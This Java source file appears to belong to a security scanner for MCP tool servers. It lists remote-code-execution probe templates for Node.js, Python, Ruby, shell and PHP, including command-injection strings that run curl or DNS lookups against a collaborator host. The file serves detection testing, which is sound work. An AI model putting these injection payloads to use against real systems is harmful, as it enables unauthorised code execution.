package com.mcpscanner.checks;

import java.util.List;

public final class ToolArgRcePayloads {

    public static final String PAYLOAD_PLACEHOLDER = "<PAYLOAD>";

    public record RcePayloadTemplate(String label, String language, String template) {
        public String render(String collaboratorSubdomain) {
            return template.replace(PAYLOAD_PLACEHOLDER, collaboratorSubdomain);
        }
    }

    private static final List<RcePayloadTemplate> TEMPLATES = List.of(
            new RcePayloadTemplate("NODE_DNS_LOOKUP", "Node.js",
                    "require('dns').lookup('<PAYLOAD>', ()=>{})"),
            new RcePayloadTemplate("NODE_FUNCTION_CTOR", "Node.js",
                    "(new Function('return require(\"dns\").lookup(\"<PAYLOAD>\",()=>{})'))()"),
            new RcePayloadTemplate("PYTHON_EVAL", "Python",
                    "__import__('socket').gethostbyname('<PAYLOAD>')"),
            new RcePayloadTemplate("PYTHON_EXEC_OS", "Python",
                    "__import__('os').system('curl http://<PAYLOAD>/')"),
            new RcePayloadTemplate("RUBY_SOCKET", "Ruby",
                    "require 'socket'; Socket.getaddrinfo('<PAYLOAD>', 80)"),
            new RcePayloadTemplate("SHELL_SEMICOLON", "Shell",
                    ";curl http://<PAYLOAD>/"),
            new RcePayloadTemplate("SHELL_BACKTICK", "Shell",
                    "`curl http://<PAYLOAD>/`"),
            new RcePayloadTemplate("SHELL_DOLLAR_PAREN", "Shell",
                    "$(curl http://<PAYLOAD>/)"),
            new RcePayloadTemplate("PHP_SYSTEM", "PHP",
                    "system('curl http://<PAYLOAD>/')")
    );

    private ToolArgRcePayloads() {}

    public static List<RcePayloadTemplate> all() {
        return TEMPLATES;
    }
}
